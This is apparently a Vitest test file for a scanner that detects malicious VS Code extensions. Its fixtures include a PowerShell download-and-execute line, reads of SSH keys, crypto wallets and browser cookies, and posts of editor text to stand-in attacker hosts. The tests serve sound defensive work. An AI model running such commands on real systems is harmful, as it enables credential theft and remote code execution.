import { describe, expect, it } from "vitest";
import type { VsixContents, VsixManifest } from "../types.js";
import { checkAllPatterns, checkPatterns } from "./patterns.js";

function makeContents(files: Record<string, string>): VsixContents {
  const manifest: VsixManifest = {
    name: "test",
    publisher: "test",
    version: "1.0.0",
  };

  const fileMap = new Map<string, Buffer>();
  for (const [name, content] of Object.entries(files)) {
    fileMap.set(name, Buffer.from(content));
  }

  return {
    manifest,
    files: fileMap,
    basePath: "/test",
  };
}

describe("checkPatterns", () => {
  it("detects hidden PowerShell execution", () => {
    const contents = makeContents({
      "extension.js": `exec('powershell -WindowStyle Hidden -Command "test"')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "POWERSHELL_HIDDEN")).toBe(true);
  });

  it("detects PowerShell download and execute", () => {
    const contents = makeContents({
      "extension.js": `exec('powershell irm https://example.com/payload | iex')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "POWERSHELL_DOWNLOAD_EXEC")).toBe(true);
  });

  it("detects Discord webhook URLs", () => {
    const contents = makeContents({
      "extension.js": `const webhook = 'https://discord.com/api/webhooks/123/abc-def'`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "DISCORD_WEBHOOK")).toBe(true);
  });

  it("detects SSH key access", () => {
    const contents = makeContents({
      "extension.js": `const key = fs.readFileSync('.ssh/id_rsa')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "SSH_KEY_ACCESS")).toBe(true);
  });

  it("detects child_process exec calls", () => {
    const contents = makeContents({
      "extension.js": `const { exec } = require('child_process'); exec('whoami')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "REQUIRE_CHILD_PROCESS")).toBe(true);
  });

  it("detects Vercel app domains", () => {
    const contents = makeContents({
      "extension.js": `fetch('https://suspicious-payload.vercel.app/data')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "VERCEL_APP")).toBe(true);
  });

  it("does not flag clean code", () => {
    const contents = makeContents({
      "extension.js": `
        const vscode = require('vscode');
        function activate(context) {
          console.log('Extension activated');
        }
        module.exports = { activate };
      `,
    });

    const findings = checkPatterns(contents);
    expect(findings.filter((f) => f.severity === "critical" || f.severity === "high")).toHaveLength(
      0,
    );
  });
});

describe("checkPatterns - high-risk patterns", () => {
  it("detects cryptocurrency wallet access", () => {
    const contents = makeContents({
      "extension.js": `
        const walletPath = process.env.APPDATA + '/MetaMask';
        const data = fs.readFileSync(walletPath);
      `,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "CRYPTO_WALLET")).toBe(true);
    expect(findings.find((f) => f.id === "CRYPTO_WALLET")?.severity).toBe("high");
  });

  it("detects phantom wallet reference", () => {
    const contents = makeContents({
      "extension.js": `const phantomWallet = require('phantom');`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "CRYPTO_WALLET")).toBe(true);
  });

  // KEYLOGGER_PATTERN was removed from patterns.ts as it was too noisy
  // (triggered on standard VS Code APIs like onDidChangeTextDocument).
  // The behavioral check BEHAVIOR_KEYLOGGER in behavioral.ts now handles
  // this with multi-stage detection (capture + store + exfiltrate).

  it("detects network data exfiltration pattern", () => {
    const contents = makeContents({
      "extension.js": `
        const content = document.getText();
        axios.post('https://attacker.com/exfil', { data: content });
      `,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "NETWORK_EXFIL")).toBe(true);
  });

  it("detects browser storage access", () => {
    const contents = makeContents({
      "extension.js": `
        const chromePath = process.env.APPDATA + '/Google\\\\Chrome/User Data/Default/Cookies';
        const cookies = fs.readFileSync(chromePath);
      `,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "BROWSER_STORAGE")).toBe(true);
  });

  it("detects obfuscated code patterns", () => {
    const contents = makeContents({
      "extension.js": `
        const _0x1234 = '\\x68\\x65\\x6c\\x6c\\x6f\\x77\\x6f\\x72\\x6c\\x64';
        eval(_0x1234);
      `,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "OBFUSCATED_CODE")).toBe(true);
  });

  it("detects PythonAnywhere exfiltration domain", () => {
    const contents = makeContents({
      "extension.js": `fetch('https://attacker123.pythonanywhere.com/receive')`,
    });

    const findings = checkPatterns(contents);
    expect(findings.some((f) => f.id === "PYTHONANYWHERE")).toBe(true);
  });
});

describe("checkAllPatterns", () => {
  it("detects native binary files", () => {
    const contents = makeContents({
      "native.node": "binary content",
      "lib.dll": "binary content",
    });

    const findings = checkAllPatterns(contents);
    expect(findings.filter((f) => f.id === "NATIVE_BINARY")).toHaveLength(2);
  });
});
